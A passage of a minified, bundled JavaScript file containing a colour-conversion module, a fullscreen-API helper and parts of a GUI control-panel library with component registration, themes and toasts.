                        function U(e, t) {
                            t = t || 6;
                            for (var e = g(e).toHsv(), i = e.h, n = e.s, r = e.v, o = [], a = 1 / t; t--;)
                                o.push(g({
                                    h: i,
                                    s: n,
                                    v: r
                                })),
                                    r = (r + a) % 1;
                            return o
                        }
                        function D(e) {
                            return e = parseFloat(e),
                                e = isNaN(e) || e < 0 || 1 < e ? 1 : e
                        }
                        function v(e, t) {
                            "string" == typeof (i = e) && -1 != i.indexOf(".") && 1 === parseFloat(i) && (e = "100%");
                            var i = "string" == typeof (i = e) && -1 != i.indexOf("%");
                            return e = l(t, I(0, parseFloat(e))),
                                i && (e = parseInt(e * t, 10) / 100),
                                u.abs(e - t) < 1e-6 ? 1 : e % t / parseFloat(t)
                        }
                        function M(e) {
                            return l(1, I(0, e))
                        }
                        function f(e) {
                            return parseInt(e, 16)
                        }
                        function L(e) {
                            return 1 == e.length ? "0" + e : "" + e
                        }
                        function G(e) {
                            return e = e <= 1 ? 100 * e + "%" : e
                        }
                        function y(e) {
                            return u.round(255 * parseFloat(e)).toString(16)
                        }
                        function H(e) {
                            return f(e) / 255
                        }
                        function P(e) {
                            return O.CSS_UNIT.exec(e)
                        }
                        u = Math,
                            d = /^\s+/,
                            T = /\s+$/,
                            A = 0,
                            h = u.round,
                            l = u.min,
                            I = u.max,
                            a = u.random,
                            g.prototype = {
                                isDark: function () {
                                    return this.getBrightness() < 128
                                },
                                isLight: function () {
                                    return !this.isDark()
                                },
                                isValid: function () {
                                    return this._ok
                                },
                                getOriginalInput: function () {
                                    return this._originalInput
                                },
                                getFormat: function () {
                                    return this._format
                                },
                                getAlpha: function () {
                                    return this._a
                                },
                                getBrightness: function () {
                                    var e = this.toRgb();
                                    return (299 * e.r + 587 * e.g + 114 * e.b) / 1e3
                                },
                                getLuminance: function () {
                                    var e = this.toRgb()
                                        , t = e.r / 255
                                        , i = e.g / 255
                                        , e = e.b / 255;
                                    return .2126 * (t <= .03928 ? t / 12.92 : u.pow((.055 + t) / 1.055, 2.4)) + .7152 * (i <= .03928 ? i / 12.92 : u.pow((.055 + i) / 1.055, 2.4)) + .0722 * (e <= .03928 ? e / 12.92 : u.pow((.055 + e) / 1.055, 2.4))
                                },
                                setAlpha: function (e) {
                                    return this._a = D(e),
                                        this._roundA = h(100 * this._a) / 100,
                                        this
                                },
                                toHsv: function () {
                                    var e = E(this._r, this._g, this._b);
                                    return {
                                        h: 360 * e.h,
                                        s: e.s,
                                        v: e.v,
                                        a: this._a
                                    }
                                },
                                toHsvString: function () {
                                    var e = E(this._r, this._g, this._b)
                                        , t = h(360 * e.h)
                                        , i = h(100 * e.s)
                                        , e = h(100 * e.v);
                                    return 1 == this._a ? "hsv(" + t + ", " + i + "%, " + e + "%)" : "hsva(" + t + ", " + i + "%, " + e + "%, " + this._roundA + ")"
                                },
                                toHsl: function () {
                                    var e = _(this._r, this._g, this._b);
                                    return {
                                        h: 360 * e.h,
                                        s: e.s,
                                        l: e.l,
                                        a: this._a
                                    }
                                },
                                toHslString: function () {
                                    var e = _(this._r, this._g, this._b)
                                        , t = h(360 * e.h)
                                        , i = h(100 * e.s)
                                        , e = h(100 * e.l);
                                    return 1 == this._a ? "hsl(" + t + ", " + i + "%, " + e + "%)" : "hsla(" + t + ", " + i + "%, " + e + "%, " + this._roundA + ")"
                                },
                                toHex: function (e) {
                                    return p(this._r, this._g, this._b, e)
                                },
                                toHexString: function (e) {
                                    return "#" + this.toHex(e)
                                },
                                toHex8: function (e) {
                                    return t = this._r,
                                        i = this._g,
                                        n = this._b,
                                        r = this._a,
                                        e = e,
                                        t = [L(h(t).toString(16)), L(h(i).toString(16)), L(h(n).toString(16)), L(y(r))],
                                        e && t[0].charAt(0) == t[0].charAt(1) && t[1].charAt(0) == t[1].charAt(1) && t[2].charAt(0) == t[2].charAt(1) && t[3].charAt(0) == t[3].charAt(1) ? t[0].charAt(0) + t[1].charAt(0) + t[2].charAt(0) + t[3].charAt(0) : t.join("");
                                    var t, i, n, r
                                },
                                toHex8String: function (e) {
                                    return "#" + this.toHex8(e)
                                },
                                toRgb: function () {
                                    return {
                                        r: h(this._r),
                                        g: h(this._g),
                                        b: h(this._b),
                                        a: this._a
                                    }
                                },
                                toRgbString: function () {
                                    return 1 == this._a ? "rgb(" + h(this._r) + ", " + h(this._g) + ", " + h(this._b) + ")" : "rgba(" + h(this._r) + ", " + h(this._g) + ", " + h(this._b) + ", " + this._roundA + ")"
                                },
                                toPercentageRgb: function () {
                                    return {
                                        r: h(100 * v(this._r, 255)) + "%",
                                        g: h(100 * v(this._g, 255)) + "%",
                                        b: h(100 * v(this._b, 255)) + "%",
                                        a: this._a
                                    }
                                },
                                toPercentageRgbString: function () {
                                    return 1 == this._a ? "rgb(" + h(100 * v(this._r, 255)) + "%, " + h(100 * v(this._g, 255)) + "%, " + h(100 * v(this._b, 255)) + "%)" : "rgba(" + h(100 * v(this._r, 255)) + "%, " + h(100 * v(this._g, 255)) + "%, " + h(100 * v(this._b, 255)) + "%, " + this._roundA + ")"
                                },
                                toName: function () {
                                    return 0 === this._a ? "transparent" : !(this._a < 1) && (s[p(this._r, this._g, this._b, !0)] || !1)
                                },
                                toFilter: function (e) {
                                    var t = "#" + R(this._r, this._g, this._b, this._a)
                                        , i = t;
                                    return "progid:DXImageTransform.Microsoft.gradient(" + (this._gradientType ? "GradientType = 1, " : "") + "startColorstr=" + t + ",endColorstr=" + (i = e ? "#" + R((t = g(e))._r, t._g, t._b, t._a) : i) + ")"
                                },
                                toString: function (e) {
                                    var t = !!e
                                        , i = (e = e || this._format,
                                            !1)
                                        , n = this._a < 1 && 0 <= this._a;
                                    return t || !n || "hex" !== e && "hex6" !== e && "hex3" !== e && "hex4" !== e && "hex8" !== e && "name" !== e ? ("rgb" === e && (i = this.toRgbString()),
                                        "prgb" === e && (i = this.toPercentageRgbString()),
                                        "hex" !== e && "hex6" !== e || (i = this.toHexString()),
                                        "hex3" === e && (i = this.toHexString(!0)),
                                        "hex4" === e && (i = this.toHex8String(!0)),
                                        "hex8" === e && (i = this.toHex8String()),
                                        "name" === e && (i = this.toName()),
                                        "hsl" === e && (i = this.toHslString()),
                                        (i = "hsv" === e ? this.toHsvString() : i) || this.toHexString()) : "name" === e && 0 === this._a ? this.toName() : this.toRgbString()
                                },
                                clone: function () {
                                    return g(this.toString())
                                },
                                _applyModification: function (e, t) {
                                    e = e.apply(null, [this].concat([].slice.call(t)));
                                    return this._r = e._r,
                                        this._g = e._g,
                                        this._b = e._b,
                                        this.setAlpha(e._a),
                                        this
                                },
                                lighten: function () {
                                    return this._applyModification(S, arguments)
                                },
                                brighten: function () {
                                    return this._applyModification(m, arguments)
                                },
                                darken: function () {
                                    return this._applyModification(z, arguments)
                                },
                                desaturate: function () {
                                    return this._applyModification(C, arguments)
                                },
                                saturate: function () {
                                    return this._applyModification(b, arguments)
                                },
                                greyscale: function () {
                                    return this._applyModification(N, arguments)
                                },
                                spin: function () {
                                    return this._applyModification(B, arguments)
                                },
                                _applyCombination: function (e, t) {
                                    return e.apply(null, [this].concat([].slice.call(t)))
                                },
                                analogous: function () {
                                    return this._applyCombination(K, arguments)
                                },
                                complement: function () {
                                    return this._applyCombination(w, arguments)
                                },
                                monochromatic: function () {
                                    return this._applyCombination(U, arguments)
                                },
                                splitcomplement: function () {
                                    return this._applyCombination(k, arguments)
                                },
                                triad: function () {
                                    return this._applyCombination(W, arguments)
                                },
                                tetrad: function () {
                                    return this._applyCombination(V, arguments)
                                }
                            },
                            g.fromRatio = function (e, t) {
                                if ("object" == typeof e) {
                                    var i, n = {};
                                    for (i in e)
                                        e.hasOwnProperty(i) && (n[i] = "a" === i ? e[i] : G(e[i]));
                                    e = n
                                }
                                return g(e, t)
                            }
                            ,
                            g.equals = function (e, t) {
                                return !(!e || !t) && g(e).toRgbString() == g(t).toRgbString()
                            }
                            ,
                            g.random = function () {
                                return g.fromRatio({
                                    r: a(),
                                    g: a(),
                                    b: a()
                                })
                            }
                            ,
                            g.mix = function (e, t, i) {
                                i = 0 === i ? 0 : i || 50;
                                e = g(e).toRgb(),
                                    t = g(t).toRgb(),
                                    i /= 100;
                                return g({
                                    r: (t.r - e.r) * i + e.r,
                                    g: (t.g - e.g) * i + e.g,
                                    b: (t.b - e.b) * i + e.b,
                                    a: (t.a - e.a) * i + e.a
                                })
                            }
                            ,
                            g.readability = function (e, t) {
                                e = g(e),
                                    t = g(t);
                                return (u.max(e.getLuminance(), t.getLuminance()) + .05) / (u.min(e.getLuminance(), t.getLuminance()) + .05)
                            }
                            ,
                            g.isReadable = function (e, t, i) {
                                var n = g.readability(e, t)
                                    , r = !1;
                                switch ((i = {
                                    level: t = "AA" !== (t = ((e = (e = i) || {
                                        level: "AA",
                                        size: "small"
                                    }).level || "AA").toUpperCase()) && "AAA" !== t ? "AA" : t,
                                    size: t = "small" !== (t = (e.size || "small").toLowerCase()) && "large" !== t ? "small" : t
                                }).level + i.size) {
                                    case "AAsmall":
                                    case "AAAlarge":
                                        r = 4.5 <= n;
                                        break;
                                    case "AAlarge":
                                        r = 3 <= n;
                                        break;
                                    case "AAAsmall":
                                        r = 7 <= n
                                }
                                return r
                            }
                            ,
                            g.mostReadable = function (e, t, i) {
                                for (var n, r = null, o = 0, a = (i = i || {}).includeFallbackColors, s = i.level, _ = i.size, E = 0; E < t.length; E++)
                                    (n = g.readability(e, t[E])) > o && (o = n,
                                        r = g(t[E]));
                                return g.isReadable(e, r, {
                                    level: s,
                                    size: _
                                }) || !a ? r : (i.includeFallbackColors = !1,
                                    g.mostReadable(e, ["#fff", "#000"], i))
                            }
                            ,
                            c = g.names = {
                                aliceblue: "f0f8ff",
                                antiquewhite: "faebd7",
                                aqua: "0ff",
                                aquamarine: "7fffd4",
                                azure: "f0ffff",
                                beige: "f5f5dc",
                                bisque: "ffe4c4",
                                black: "000",
                                blanchedalmond: "ffebcd",
                                blue: "00f",
                                blueviolet: "8a2be2",
                                brown: "a52a2a",
                                burlywood: "deb887",
                                burntsienna: "ea7e5d",
                                cadetblue: "5f9ea0",
                                chartreuse: "7fff00",
                                chocolate: "d2691e",
                                coral: "ff7f50",
                                cornflowerblue: "6495ed",
                                cornsilk: "fff8dc",
                                crimson: "dc143c",
                                cyan: "0ff",
                                darkblue: "00008b",
                                darkcyan: "008b8b",
                                darkgoldenrod: "b8860b",
                                darkgray: "a9a9a9",
                                darkgreen: "006400",
                                darkgrey: "a9a9a9",
                                darkkhaki: "bdb76b",
                                darkmagenta: "8b008b",
                                darkolivegreen: "556b2f",
                                darkorange: "ff8c00",
                                darkorchid: "9932cc",
                                darkred: "8b0000",
                                darksalmon: "e9967a",
                                darkseagreen: "8fbc8f",
                                darkslateblue: "483d8b",
                                darkslategray: "2f4f4f",
                                darkslategrey: "2f4f4f",
                                darkturquoise: "00ced1",
                                darkviolet: "9400d3",
                                deeppink: "ff1493",
                                deepskyblue: "00bfff",
                                dimgray: "696969",
                                dimgrey: "696969",
                                dodgerblue: "1e90ff",
                                firebrick: "b22222",
                                floralwhite: "fffaf0",
                                forestgreen: "228b22",
                                fuchsia: "f0f",
                                gainsboro: "dcdcdc",
                                ghostwhite: "f8f8ff",
                                gold: "ffd700",
                                goldenrod: "daa520",
                                gray: "808080",
                                green: "008000",
                                greenyellow: "adff2f",
                                grey: "808080",
                                honeydew: "f0fff0",
                                hotpink: "ff69b4",
                                indianred: "cd5c5c",
                                indigo: "4b0082",
                                ivory: "fffff0",
                                khaki: "f0e68c",
                                lavender: "e6e6fa",
                                lavenderblush: "fff0f5",
                                lawngreen: "7cfc00",
                                lemonchiffon: "fffacd",
                                lightblue: "add8e6",
                                lightcoral: "f08080",
                                lightcyan: "e0ffff",
                                lightgoldenrodyellow: "fafad2",
                                lightgray: "d3d3d3",
                                lightgreen: "90ee90",
                                lightgrey: "d3d3d3",
                                lightpink: "ffb6c1",
                                lightsalmon: "ffa07a",
                                lightseagreen: "20b2aa",
                                lightskyblue: "87cefa",
                                lightslategray: "789",
                                lightslategrey: "789",
                                lightsteelblue: "b0c4de",
                                lightyellow: "ffffe0",
                                lime: "0f0",
                                limegreen: "32cd32",
                                linen: "faf0e6",
                                magenta: "f0f",
                                maroon: "800000",
                                mediumaquamarine: "66cdaa",
                                mediumblue: "0000cd",
                                mediumorchid: "ba55d3",
                                mediumpurple: "9370db",
                                mediumseagreen: "3cb371",
                                mediumslateblue: "7b68ee",
                                mediumspringgreen: "00fa9a",
                                mediumturquoise: "48d1cc",
                                mediumvioletred: "c71585",
                                midnightblue: "191970",
                                mintcream: "f5fffa",
                                mistyrose: "ffe4e1",
                                moccasin: "ffe4b5",
                                navajowhite: "ffdead",
                                navy: "000080",
                                oldlace: "fdf5e6",
                                olive: "808000",
                                olivedrab: "6b8e23",
                                orange: "ffa500",
                                orangered: "ff4500",
                                orchid: "da70d6",
                                palegoldenrod: "eee8aa",
                                palegreen: "98fb98",
                                paleturquoise: "afeeee",
                                palevioletred: "db7093",
                                papayawhip: "ffefd5",
                                peachpuff: "ffdab9",
                                peru: "cd853f",
                                pink: "ffc0cb",
                                plum: "dda0dd",
                                powderblue: "b0e0e6",
                                purple: "800080",
                                rebeccapurple: "663399",
                                red: "f00",
                                rosybrown: "bc8f8f",
                                royalblue: "4169e1",
                                saddlebrown: "8b4513",
                                salmon: "fa8072",
                                sandybrown: "f4a460",
                                seagreen: "2e8b57",
                                seashell: "fff5ee",
                                sienna: "a0522d",
                                silver: "c0c0c0",
                                skyblue: "87ceeb",
                                slateblue: "6a5acd",
                                slategray: "708090",
                                slategrey: "708090",
                                snow: "fffafa",
                                springgreen: "00ff7f",
                                steelblue: "4682b4",
                                tan: "d2b48c",
                                teal: "008080",
                                thistle: "d8bfd8",
                                tomato: "ff6347",
                                turquoise: "40e0d0",
                                violet: "ee82ee",
                                wheat: "f5deb3",
                                white: "fff",
                                whitesmoke: "f5f5f5",
                                yellow: "ff0",
                                yellowgreen: "9acd32"
                            },
                            s = g.hexNames = function (e) {
                                var t, i = {};
                                for (t in e)
                                    e.hasOwnProperty(t) && (i[e[t]] = t);
                                return i
                            }(c),
                            r = "[\\s|\\(]+(" + (n = "(?:[-\\+]?\\d*\\.\\d+%?)|(?:[-\\+]?\\d+%?)") + ")[,|\\s]+(" + n + ")[,|\\s]+(" + n + ")\\s*\\)?",
                            o = "[\\s|\\(]+(" + n + ")[,|\\s]+(" + n + ")[,|\\s]+(" + n + ")[,|\\s]+(" + n + ")\\s*\\)?",
                            O = {
                                CSS_UNIT: new RegExp(n),
                                rgb: new RegExp("rgb" + r),
                                rgba: new RegExp("rgba" + o),
                                hsl: new RegExp("hsl" + r),
                                hsla: new RegExp("hsla" + o),
                                hsv: new RegExp("hsv" + r),
                                hsva: new RegExp("hsva" + o),
                                hex3: /^#?([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})$/,
                                hex6: /^#?([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/,
                                hex4: /^#?([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})$/,
                                hex8: /^#?([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/
                            },
                            void 0 !== e && e.exports ? e.exports = g : void 0 !== (n = function () {
                                return g
                            }
                                .call(t, i, t, e)) && (e.exports = n)
                    }
                    , function (n, e) {
                        !function () {
                            "use strict";
                            var o = "undefined" != typeof window && void 0 !== window.document ? window.document : {}
                                , e = void 0 !== n && n.exports
                                , r = function () {
                                    for (var e, t = [["requestFullscreen", "exitFullscreen", "fullscreenElement", "fullscreenEnabled", "fullscreenchange", "fullscreenerror"], ["webkitRequestFullscreen", "webkitExitFullscreen", "webkitFullscreenElement", "webkitFullscreenEnabled", "webkitfullscreenchange", "webkitfullscreenerror"], ["webkitRequestFullScreen", "webkitCancelFullScreen", "webkitCurrentFullScreenElement", "webkitCancelFullScreen", "webkitfullscreenchange", "webkitfullscreenerror"], ["mozRequestFullScreen", "mozCancelFullScreen", "mozFullScreenElement", "mozFullScreenEnabled", "mozfullscreenchange", "mozfullscreenerror"], ["msRequestFullscreen", "msExitFullscreen", "msFullscreenElement", "msFullscreenEnabled", "MSFullscreenChange", "MSFullscreenError"]], i = 0, n = t.length, r = {}; i < n; i++)
                                        if ((e = t[i]) && e[1] in o) {
                                            for (i = 0; i < e.length; i++)
                                                r[t[0][i]] = e[i];
                                            return r
                                        }
                                    return !1
                                }()
                                , i = {
                                    change: r.fullscreenchange,
                                    error: r.fullscreenerror
                                }
                                , t = {
                                    request: function (n) {
                                        return new Promise(function (e, t) {
                                            var i = function () {
                                                this.off("change", i),
                                                    e()
                                            }
                                                .bind(this);
                                            this.on("change", i),
                                                n = n || o.documentElement,
                                                Promise.resolve(n[r.requestFullscreen]()).catch(t)
                                        }
                                            .bind(this))
                                    },
                                    exit: function () {
                                        return new Promise(function (e, t) {
                                            var i;
                                            this.isFullscreen ? (i = function () {
                                                this.off("change", i),
                                                    e()
                                            }
                                                .bind(this),
                                                this.on("change", i),
                                                Promise.resolve(o[r.exitFullscreen]()).catch(t)) : e()
                                        }
                                            .bind(this))
                                    },
                                    toggle: function (e) {
                                        return this.isFullscreen ? this.exit() : this.request(e)
                                    },
                                    onchange: function (e) {
                                        this.on("change", e)
                                    },
                                    onerror: function (e) {
                                        this.on("error", e)
                                    },
                                    on: function (e, t) {
                                        e = i[e];
                                        e && o.addEventListener(e, t, !1)
                                    },
                                    off: function (e, t) {
                                        e = i[e];
                                        e && o.removeEventListener(e, t, !1)
                                    },
                                    raw: r
                                };
                            if (!r)
                                return e ? n.exports = {
                                    isEnabled: !1
                                } : window.screenfull = {
                                    isEnabled: !1
                                };
                            Object.defineProperties(t, {
                                isFullscreen: {
                                    get: function () {
                                        return Boolean(o[r.fullscreenElement])
                                    }
                                },
                                element: {
                                    enumerable: !0,
                                    get: function () {
                                        return o[r.fullscreenElement]
                                    }
                                },
                                isEnabled: {
                                    enumerable: !0,
                                    get: function () {
                                        return Boolean(o[r.fullscreenEnabled])
                                    }
                                }
                            }),
                                e ? n.exports = t : window.screenfull = t
                        }()
                    }
                    , function (e, t, i) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        i = i(17),
                            i = i && i.__esModule ? i : {
                                default: i
                            };
                        t.default = i.default,
                            e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
                        function n(e) {
                            return e && e.__esModule ? e : {
                                default: e
                            }
                        }
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var r = function (e, t, i) {
                            return t && I(e.prototype, t),
                                i && I(e, i),
                                e
                        }
                            , o = n(i(0))
                            , a = n(i(23))
                            , s = n(i(9))
                            , _ = i(1)
                            , E = i(24)
                            , u = i(72)
                            , d = i(74)
                            , T = i(77)
                            , A = n(i(15))
                            , h = i(79)
                            , i = (r(l, [{
                                key: "_LoadStyles",
                                value: function () {
                                    function e(e) {
                                        var t = document.createElement("style");
                                        t.setAttribute("type", "text/css"),
                                            t.setAttribute("rel", "stylesheet"),
                                            t.setAttribute("href", e),
                                            document.getElementsByTagName("head")[0].appendChild(t)
                                    }
                                    e("//cdn.jsdelivr.net/font-hack/2.019/css/hack.min.css"),
                                        _.theme.font ? (_.theme.font.fontURL && e(_.theme.font.fontURL),
                                            _.theme.font.fontFamily && (0,
                                                o.default)(this.container, "font-family", _.theme.font.fontFamily),
                                            _.theme.font.fontSize && (0,
                                                o.default)(this.container, "font-size", _.theme.font.fontSize),
                                            _.theme.font.fontWeight && (0,
                                                o.default)(this.container, "font-weight", _.theme.font.fontWeight)) : (0,
                                                    o.default)(this.container, "font-family", "'Hack', monospace")
                                }
                            }, {
                                key: "_ConstructElements",
                                value: function () {
                                    var e = this
                                        , t = (this.container = document.createElement("div"),
                                            this.container.classList.add(h["yusukefy-container"]),
                                            {});
                                    "overlay" != this.opts.barMode && "above" != this.opts.barMode && "none" != this.opts.barMode || (t.position = "absolute"),
                                        this.hasRoot && "above" == this.opts.barMode && (t.top = "-" + _.theme.sizing.menuBarHeight),
                                        (0,
                                            o.default)(this.container, t),
                                        this.opts.root.insertBefore(this.container, this.opts.root.childNodes[0]),
                                        "none" !== this.opts.barMode && (this.bar = new u.MenuBar(this.container, this.opts),
                                            this.bar.addListener("ontogglepanel", function () {
                                                e.panel.ToggleVisible()
                                            }),
                                            this.bar.addListener("onfullscreenrequested", function () {
                                                e.ToggleFullscreen()
                                            })),
                                        this.panel = new d.Panel(this.container, this.opts),
                                        "none" === this.opts.barMode || !0 === this.opts.open ? this.panel.SetVisible(!0) : this.panel.SetVisible(!1),
                                        this.toaster = new T.ToastArea(this.container, this.opts)
                                }
                            }, {
                                key: "_UpdateComponents",
                                value: function () {
                                    var e = this;
                                    this.loadedComponents.forEach(function (e) {
                                        e.binding && e.binding.object[e.binding.property] != e.oldValue && (e.SetValue(e.binding.object[e.binding.property]),
                                            e.oldValue = e.binding.object[e.binding.property])
                                    }),
                                        setTimeout(function () {
                                            window.requestAnimationFrame(function () {
                                                e._UpdateComponents()
                                            })
                                        }, this.opts.pollRateMS)
                                }
                            }, {
                                key: "Register",
                                value: function (e) {
                                    var t, i = this, n = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {};
                                    if (!Array.isArray(e))
                                        return t = Object.assign(e, n),
                                            this._Register(t);
                                    e.forEach(function (e) {
                                        e = Object.assign(e, n);
                                        i._Register(e)
                                    })
                                }
                            }, {
                                key: "Remove",
                                value: function (t) {
                                    t.Remove(),
                                        this.loadedComponents = this.loadedComponents.filter(function (e) {
                                            return e !== t
                                        })
                                }
                            }, {
                                key: "_Register",
                                value: function (t) {
                                    if (t.object && t.property && void 0 === t.object[t.property])
                                        throw new Error("Object " + t.object + " has no property '" + t.property + "'");
                                    t.object && t.property && (t.initial = t.object[t.property]);
                                    var e = this.panel.panel;
                                    if (t.folder) {
                                        var i = this.loadedComponents.find(function (e) {
                                            return "folder" === e.opts.type && e.opts.label === t.folder
                                        });
                                        if (!i)
                                            throw new Error("No folder exists with the name " + t.folder);
                                        e = i.folderContainer
                                    }
                                    i = this.componentManager.Create(e, t);
                                    return t.object && t.property && (i.binding = {
                                        object: t.object,
                                        property: t.property
                                    }),
                                        i.on && (i.on("initialized", function (e) {
                                            t.onInitialize && t.onInitialize(e)
                                        }),
                                            i.on("input", function (e) {
                                                t.object && t.property && (t.object[t.property] = e),
                                                    t.onChange && t.onChange(e)
                                            })),
                                        this.loadedComponents.push(i),
                                        i
                                }
                            }, {
                                key: "Toast",
                                value: function (e) {
                                    this.toaster.CreateToast(e, 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : 5e3, 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : 0)
                                }
                            }, {
                                key: "ToggleFullscreen",
                                value: function () {
                                    A.default.isFullscreen ? A.default.exit() : (console.log("Request fullscreen"),
                                        A.default.request(this.opts.root))
                                }
                            }]),
                                l);
                        function l(e) {
                            if (!(this instanceof l))
                                throw new TypeError("Cannot call a class as a function");
                            this.opts = e,
                                this.hasRoot = void 0 !== e.root,
                                e.width = e.width || 300,
                                e.root = e.root || document.body,
                                e.align = e.align || "left",
                                e.opacity = e.opacity || 1,
                                e.barMode = e.barMode || "offset",
                                e.panelMode = e.panelMode || "inner",
                                e.pollRateMS = e.pollRateMS || 100,
                                e.open = e.open || !1;
                            var t = e.theme;
                            void 0 === e.theme && (t = s.default.dark),
                                (0,
                                    a.default)(e.theme) && (t = void 0 === s.default[e.theme] ? (console.error("There is no theme preset with the name '" + e.theme + "'! Defaulting to dark theme."),
                                        s.default.dark) : s.default[e.theme]),
                                _.theme.Set(t),
                                this._ConstructElements(),
                                this._LoadStyles(),
                                this.componentManager = new E.ComponentManager,
                                this.loadedComponents = [],
                                this._UpdateComponents()
                        }
                        function I(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        t.default = i,
                            e.exports = t.default
                    }
                    , function (e, t) {
                        var o = null
                            , a = ["Webkit", "Moz", "O", "ms"];
                        e.exports = function (e) {
                            var t = (o = o || document.createElement("div")).style;
                            if (e in t)
                                return e;
                            for (var i = e.charAt(0).toUpperCase() + e.slice(1), n = a.length; 0 <= n; n--) {
                                var r = a[n] + i;
                                if (r in t)
                                    return r
                            }
                            return !1
                        }
                    }
                    , function (e, t, i) {
                        var n = i(20);
                        e.exports = function (e) {
                            return n(e).replace(/\s(\w)/g, function (e, t) {
                                return t.toUpperCase()
                            })
                        }
                    }
                    , function (e, t, i) {
                        var n = i(21);
                        e.exports = function (e) {
                            return n(e).replace(/[\W_]+(.|$)/g, function (e, t) {
                                return t ? " " + t : ""
                            }).trim()
                        }
                    }
                    , function (e, t) {
                        e.exports = function (e) {
                            return (i.test(e) ? e : n.test(e) ? e.replace(o, function (e, t) {
                                return t ? " " + t : ""
                            }) || e : r.test(e) ? e.replace(a, function (e, t, i) {
                                return t + " " + i.toLowerCase().split("").join(" ")
                            }) : e).toLowerCase()
                        }
                            ;
                        var i = /\s/
                            , n = /(_|-|\.|:)/
                            , r = /([a-z][A-Z]|[A-Z][a-z])/
                            , o = /[\W_]+(.|$)/g
                            , a = /(.)([A-Z]+)/g
                    }
                    , function (e, t) {
                        var i = {
                            animationIterationCount: !0,
                            boxFlex: !0,
                            boxFlexGroup: !0,
                            boxOrdinalGroup: !0,
                            columnCount: !0,
                            flex: !0,
                            flexGrow: !0,
                            flexPositive: !0,
                            flexShrink: !0,
                            flexNegative: !0,
                            flexOrder: !0,
                            gridRow: !0,
                            gridColumn: !0,
                            fontWeight: !0,
                            lineClamp: !0,
                            lineHeight: !0,
                            opacity: !0,
                            order: !0,
                            orphans: !0,
                            tabSize: !0,
                            widows: !0,
                            zIndex: !0,
                            zoom: !0,
                            fillOpacity: !0,
                            stopOpacity: !0,
                            strokeDashoffset: !0,
                            strokeOpacity: !0,
                            strokeWidth: !0
                        };
                        e.exports = function (e, t) {
                            return "number" != typeof t || i[e] ? t : t + "px"
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = String.prototype.valueOf
                            , r = Object.prototype.toString
                            , o = "function" == typeof Symbol && "symbol" == typeof Symbol.toStringTag;
                        e.exports = function (e) {
                            return "string" == typeof e || "object" == typeof e && (o ? function (e) {
                                try {
                                    return n.call(e),
                                        !0
                                } catch (e) {
                                    return !1
                                }
                            }(e) : "[object String]" === r.call(e))
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        }),
                            t.ComponentManager = void 0;
                        var n = function (e, t, i) {
                            return t && s(e.prototype, t),
                                i && s(e, i),
                                e
                        }
                            , r = i(25)
                            , o = r && r.__esModule ? r : {
                                default: r
                            }
                            , a = i(1);
                        function s(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        function _() {
                            if (!(this instanceof _))
                                throw new TypeError("Cannot call a class as a function");
                            this.uuid = (0,
                                o.default)(),
                                this.components = {
                                    title: i(28),
                                    range: i(29),
                                    button: i(46),
                                    checkbox: i(48),
                                    select: i(50),
                                    text: i(52),
                                    color: i(53),
                                    folder: i(65),
                                    file: i(67),
                                    display: i(69),
                                    interval: i(70)
                                }
                        }
                        t.ComponentManager = (n(_, [{
                            key: "Create",
                            value: function (e, t) {
                                if (void 0 === this.components[t.type])
                                    throw new Error("No component type named '" + t.type + "' exists.");
                                e = new this.components[t.type](e, t, a.theme, this.uuid);
                                return Object.assign(e, {
                                    Remove: function () {
                                        this.container.parentNode.removeChild(this.container)
                                    }
                                }),
                                    e
                            }
                        }]),
                            _)
                    }
                    , function (e, t, i) {
                        var a = i(26)
                            , s = i(27);
                        e.exports = function (e, t, i) {
                            var n = t && i || 0
                                , r = ("string" == typeof e && (t = "binary" === e ? new Array(16) : null,
                                    e = null),
                                    (e = e || {}).random || (e.rng || a)());
                            if (r[6] = 15 & r[6] | 64,
                                r[8] = 63 & r[8] | 128,
                                t)
                                for (var o = 0; o < 16; ++o)
                                    t[n + o] = r[o];
                            return t || s(r)
                        }
                    }
                    , function (e, t) {
                        var i, n, r = "undefined" != typeof crypto && crypto.getRandomValues && crypto.getRandomValues.bind(crypto) || "undefined" != typeof msCrypto && "function" == typeof window.msCrypto.getRandomValues && msCrypto.getRandomValues.bind(msCrypto);
                        r ? (i = new Uint8Array(16),
                            e.exports = function () {
                                return r(i),
                                    i
                            }
                        ) : (n = new Array(16),
                            e.exports = function () {
                                for (var e, t = 0; t < 16; t++)
                                    0 == (3 & t) && (e = 4294967296 * Math.random()),
                                        n[t] = e >>> ((3 & t) << 3) & 255;
                                return n
                            }
                        )
                    }
                    , function (e, t) {
                        for (var n = [], i = 0; i < 256; ++i)
                            n[i] = (i + 256).toString(16).substr(1);
                        e.exports = function (e, t) {
                            var t = t || 0
                                , i = n;
                            return [i[e[t++]], i[e[t++]], i[e[t++]], i[e[t++]], "-", i[e[t++]], i[e[t++]], "-", i[e[t++]], i[e[t++]], "-", i[e[t++]], i[e[t++]], "-", i[e[t++]], i[e[t++]], i[e[t++]], i[e[t++]], i[e[t++]], i[e[+t]]].join("")
                        }
                    }
                    , function (e, t, r) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var i = r(0)
                            , o = i && i.__esModule ? i : {
                                default: i
                            };
